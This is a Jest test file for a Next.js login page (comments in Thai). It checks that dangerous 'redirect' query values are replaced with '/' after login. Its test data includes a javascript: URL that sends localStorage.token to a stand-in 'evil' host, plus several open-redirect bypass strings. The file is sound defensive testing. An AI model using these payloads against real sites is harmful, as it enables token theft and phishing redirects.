import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import LoginPage from './page';
import { useAuth } from '@/contexts/AuthContext';

const replace = jest.fn();
let query = '';
jest.mock('next/navigation', () => ({
  useRouter: () => ({ replace, push: jest.fn() }),
  useSearchParams: () => new URLSearchParams(query),
}));
jest.mock('@/contexts/AuthContext', () => ({ useAuth: jest.fn() }));
jest.mock('@react-oauth/google', () => ({
  GoogleLogin: ({ onSuccess }: { onSuccess: (r: { credential?: string }) => void }) => (
    <button type="button" onClick={() => onSuccess({ credential: 'google-id-token' })}>
      Google
    </button>
  ),
}));
jest.mock('react-toastify', () => ({ toast: { success: jest.fn(), error: jest.fn() } }));

const mockedUseAuth = useAuth as jest.Mock;
const login = jest.fn();
const loginWithGoogle = jest.fn();

function setQuery(redirect: string) {
  query = new URLSearchParams({ redirect }).toString();
}

describe('LoginPage — redirect หลัง login (SEC-13)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    login.mockResolvedValue(undefined);
    loginWithGoogle.mockResolvedValue(undefined);
  });

  describe('ผู้ใช้ login อยู่แล้วเปิดหน้า login', () => {
    beforeEach(() => {
      mockedUseAuth.mockReturnValue({
        user: { id: 'u1', email: 'a@b.c', role: 'user' },
        loading: false,
        login,
        loginWithGoogle,
      });
    });

    it.each([
      "javascript:fetch('//evil/?t='+localStorage.token)",
      'JaVaScRiPt:alert(1)',
      'https://evil.example',
      '//evil.example',
      '/%2F/evil.example',
      '/.//evil',
    ])('redirect=%p → router.replace("/")', async (redirect) => {
      setQuery(redirect);
      render(<LoginPage />);
      await waitFor(() => expect(replace).toHaveBeenCalled());
      expect(replace).toHaveBeenCalledWith('/');
      expect(replace).not.toHaveBeenCalledWith(redirect);
    });

    it('redirect ภายในยังกลับไปหน้าเดิมได้', async () => {
      setQuery('/practice/exam/abc?x=1#h');
      render(<LoginPage />);
      await waitFor(() => expect(replace).toHaveBeenCalledWith('/practice/exam/abc?x=1#h'));
    });
  });

  describe('ผู้ใช้ยังไม่ login', () => {
    beforeEach(() => {
      mockedUseAuth.mockReturnValue({ user: null, loading: false, login, loginWithGoogle });
    });

    it('login ด้วยอีเมลแล้ว redirect อันตรายถูกแทนด้วย "/"', async () => {
      setQuery('javascript:alert(1)');
      render(<LoginPage />);
      fireEvent.change(screen.getByLabelText('อีเมล'), { target: { value: 'a@b.c' } });
      fireEvent.change(screen.getByLabelText('รหัสผ่าน'), { target: { value: 'secret' } });
      fireEvent.click(screen.getByRole('button', { name: 'เข้าสู่ระบบ' }));
      await waitFor(() => expect(replace).toHaveBeenCalledWith('/'));
      expect(login).toHaveBeenCalledWith('a@b.c', 'secret');
      expect(replace).not.toHaveBeenCalledWith('javascript:alert(1)');
    });

    it('login ด้วยอีเมลแล้วกลับ path ภายในได้', async () => {
      setQuery('/dashboard');
      render(<LoginPage />);
      fireEvent.change(screen.getByLabelText('อีเมล'), { target: { value: 'a@b.c' } });
      fireEvent.change(screen.getByLabelText('รหัสผ่าน'), { target: { value: 'secret' } });
      fireEvent.click(screen.getByRole('button', { name: 'เข้าสู่ระบบ' }));
      await waitFor(() => expect(replace).toHaveBeenCalledWith('/dashboard'));
    });

    it('login ด้วย Google แล้ว redirect ไปเว็บอื่นถูกแทนด้วย "/"', async () => {
      setQuery('https://evil.example');
      render(<LoginPage />);
      fireEvent.click(screen.getByRole('button', { name: 'Google' }));
      await waitFor(() => expect(replace).toHaveBeenCalledWith('/'));
      expect(loginWithGoogle).toHaveBeenCalledWith('google-id-token');
      expect(replace).not.toHaveBeenCalledWith('https://evil.example');
    });
  });
});
